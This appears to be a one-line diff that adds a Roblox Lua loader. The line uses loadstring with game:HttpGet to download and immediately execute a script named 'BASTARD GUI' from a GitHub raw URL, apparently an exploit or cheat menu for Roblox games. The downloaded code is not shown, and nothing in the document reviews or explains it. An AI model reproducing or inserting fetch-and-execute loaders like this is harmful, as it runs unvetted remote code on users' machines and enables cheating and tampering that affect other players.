@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bennytrt/BASTARD-GUI/main/bastard%20gui.txt",true))()
